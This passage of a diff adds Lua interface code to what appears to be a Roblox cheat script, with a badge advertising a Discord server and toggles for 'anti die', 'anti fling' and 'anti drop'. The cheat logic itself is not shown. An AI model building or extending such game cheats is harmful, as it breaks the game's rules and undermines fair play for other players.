+				startPos.X.Scale, startPos.X.Offset + delta.X,
+				startPos.Y.Scale, startPos.Y.Offset + delta.Y
+			)
+		end
+	end)
+	UserInputService.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+end
+
+
+local topBadge = Instance.new("Frame")
+topBadge.Name = "TopBadge"
+topBadge.Size = UDim2.new(0, 300, 0, 28)
+topBadge.Position = UDim2.new(1, -314, 0, 10)
+topBadge.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+topBadge.BackgroundTransparency = 0.35
+topBadge.BorderSizePixel = 0
+topBadge.ZIndex = 25
+topBadge.Parent = gui
+Instance.new("UICorner", topBadge).CornerRadius = UDim.new(0, 10)
+AddAnimatedOutline(topBadge, 1.2)
+
+local topBadgeBg = Instance.new("ImageLabel")
+topBadgeBg.Name = "Bg"
+topBadgeBg.Size = UDim2.new(1, 0, 1, 0)
+topBadgeBg.BackgroundTransparency = 1
+topBadgeBg.Image = BG_ASSET
+topBadgeBg.ImageTransparency = 0.35
+topBadgeBg.ScaleType = Enum.ScaleType.Crop
+topBadgeBg.ZIndex = 25
+topBadgeBg.Parent = topBadge
+Instance.new("UICorner", topBadgeBg).CornerRadius = UDim.new(0, 10)
+
+local topBadgeText = Instance.new("TextLabel")
+topBadgeText.Name = "BadgeText"
+topBadgeText.Size = UDim2.new(1, -12, 1, 0)
+topBadgeText.Position = UDim2.new(0, 6, 0, 0)
+topBadgeText.BackgroundTransparency = 1
+topBadgeText.Text = "#1 anti die  discord.gg/fictionduels"
+topBadgeText.Font = Enum.Font.GothamBlack
+topBadgeText.TextSize = 12
+topBadgeText.TextColor3 = Color3.fromRGB(255, 255, 255)
+topBadgeText.TextXAlignment = Enum.TextXAlignment.Center
+topBadgeText.TextStrokeTransparency = 0.55
+topBadgeText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+topBadgeText.ZIndex = 27
+topBadgeText.Parent = topBadge
+
+local topBadgeGrad = Instance.new("UIGradient")
+topBadgeGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
+	ColorSequenceKeypoint.new(0.25, Color3.fromRGB(160, 160, 160)),
+	ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
+	ColorSequenceKeypoint.new(0.75, Color3.fromRGB(140, 140, 140)),
+	ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255)),
+})
+topBadgeGrad.Rotation = 0
+topBadgeGrad.Parent = topBadgeText
+table.insert(rotatingStrokes, topBadgeGrad)
+
+setToggleVisual(antiDieBg, antiDieKnob, active)
+setToggleVisual(antiFlingBg, antiFlingKnob, antiFlingOn)
+setToggleVisual(antiDropBg, antiDropKnob, antiDropOn)
+
+if isMinimized then
+	applyMinimize(true)
+end
+
+if active then
+	task.defer(function()
+		startAntiDie()
+		setToggleVisual(antiDieBg, antiDieKnob, true)
+	end)
+end
+if antiFlingOn then
+	task.defer(function()
+		startAntiFling()
+		setToggleVisual(antiFlingBg, antiFlingKnob, true)
+	end)
+end
+if antiDropOn then
+	task.defer(function()
+		startAntiDrop()
+		setToggleVisual(antiDropBg, antiDropKnob, true)
+	end)
+end
